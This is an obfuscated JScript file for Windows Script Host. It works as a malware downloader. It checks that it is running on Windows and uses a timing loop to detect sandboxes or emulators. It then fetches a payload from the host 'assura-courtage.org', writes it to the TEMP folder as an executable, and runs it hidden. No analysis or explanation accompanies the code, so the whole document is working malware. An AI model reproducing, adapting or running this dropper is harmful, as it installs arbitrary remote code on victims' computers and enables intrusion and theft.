var _R = false;
var _Y0 = "CreateObject";
var _NX = function _Y() {return WScript[_Y0]("WScript"+".Shell");}(), _KK = 11;
var _H1 = "MSXML2.XMLHTTP";
var _V = 2123213;
var _L = 0;
function _EK(_T){_NX["Run"](_T, _L, _L);};
function _H0(){return _H1 + "";};
function _D(_NG, _FZ){_L = _L * 1; return _NG - _FZ;};
function _B(){return _Y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R = true;
  @end
@*/
if (_R)
{
var _W = "";
function _F0(){return 22;};
var _TZ = 0; var _Y1 = 0;
function _OV()
{
var _DU = new this["Date"]();
var _E = _DU["getUTCMilliseconds"]();
WScript["Sleep"](_F0());
var _DU = new this["Date"]();
var _O = _DU["getUTCMilliseconds"]();
WScript["Sleep"](_F0());
var _DU = new this["Date"]();
var _NV = _DU["getUTCMilliseconds"]();
var _TZ = "_GE";
_TZ = _D(_O, _E);
var _Y1 = "_UN";
_Y1 = _D(_NV, _O);
_W = "open";
return _D(_TZ, _Y1);
}
var _LO = false;
var _IY = false;
for (var _AU = _L; _AU < _F0() * 1; _AU++){if (_OV() != _L){
_LO = true; 
_Y1 = "31" + 11 * _TZ + _Y1; 
_IY = true; 
break;
}}
function _H() {return ((_LO == true) && (_LO == _IY)) ? 1 : _L;};
if (_LO && _H() && _IY){
function _F() {return _NX["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "TvcMOlsJQ.ex" + "e";};
 _PH = _H0();
 _JY = WScript[_Y0](_PH);
 var _X = 1;
 while (_X){
try {
	if (_X == 1)
	{
		_JY[_W]("GET", "http://assura-courtage.org/j2osla", false);
		_JY["send"]();
		_XQ = "Sleep";
	}
	WScript[_XQ](_F0() + 120); 
	if (_JY["readystate"] < 2 * 2) continue;
	_X = _L;
	function _VX(_UT) {var _ZR = (1, 2, 3, 4, 5, _UT); return _ZR;};
	_B0 = WScript[_B()]("ADODB.Stream");
	_PH = _B0;
	_PH[_W]();
	_PH["type"] = _VX(1);
	_PH["write"](_JY["ResponseBody"]);
	_B0["position"] = _VX(_L);
	_PH["Save" + "ToFile"](_F(), 2);
	_B0["cl"+"ose"]();
	_JP = _F();
	_EK(_JP);
} catch(_ZO){};
}
}
}

